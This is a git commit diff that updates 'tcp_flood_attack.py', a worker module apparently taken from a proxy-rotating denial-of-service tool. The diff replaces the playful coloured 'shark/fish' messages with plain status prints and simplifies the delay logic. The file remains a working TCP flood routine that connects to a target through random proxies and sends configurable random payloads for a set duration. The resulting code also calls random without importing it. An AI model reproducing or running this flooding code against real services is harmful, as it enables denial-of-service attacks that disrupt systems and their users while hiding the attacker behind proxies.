f13ff9365cd7e0473ab67b884b969d2c990cf9f9
Sakuzuna <nikita.kopychev@s.wingateschool.com>
2025-02-27 00:04:50 +0000

    Update tcp_flood_attack.py

--- workers/tcp_flood_attack.py
+++ workers/tcp_flood_attack.py
@@ -1,43 +1,22 @@
 import socket
 import time
-from pystyle import Colorate, Colors
 from utils.client_utils import TcpClient
 from utils.random_utils import random_string
-
-COLOR_CODE = {
-    "RESET": "\033[0m",  
-    "UNDERLINE": "\033[04m",
-    "GREEN": "\033[32m",     
-    "YELLOW": "\033[93m",    
-    "RED": "\033[31m",       
-    "CYAN": "\033[36m",     
-    "BOLD": "\033[01m",        
-    "PINK": "\033[95m",
-    "URL_L": "\033[36m",       
-    "LI_G": "\033[92m",      
-    "F_CL": "\033[0m",
-    "DARK": "\033[90m",     
-}
 
 def tcp_flood_attack(target, proxies, duration, packet_size, packet_delay):
     host, port = target.split(":")
     port = int(port)
     end_time = time.time() + duration
     while time.time() < end_time:
-        start_time = time.time() 
         proxy = random.choice(proxies)
         sock = TcpClient.create_socket(proxy)
         try:
             payload = random_string(packet_size * 1024)  
             sock.connect((host, port))
             sock.send(payload.encode())
-            successsend = f"🦈 Shark sent TCP packet on fish: {host}:{port} by using proxy: {proxy['host']}:{proxy['port']}"
-            print(Colorate.Horizontal(Colors.blue_to_white, (successsend)))
+            print(f"✅ TCP packet sent to {host}:{port} via {proxy['host']}:{proxy['port']}")
         except Exception as e:
-            errorsend = f"🐟 Oh No! The fish: {host}:{port} dodged the TCP packet frоm: {proxy['host']}:{proxy['port']} Get better proxies!: "
-            print(Colorate.Horizontal(Colors.blue_to_white, (errorsend)))
+            print(f"❌ TCP packet to {host}:{port} via {proxy['host']}:{proxy['port']} failed")
         finally:
             sock.close()
-        elapsed_time = time.time() - start_time 
-        remaining_delay = max(0, (packet_delay / 1000) - elapsed_time) 
-        time.sleep(remaining_delay)  
+        time.sleep(packet_delay / 1000)  
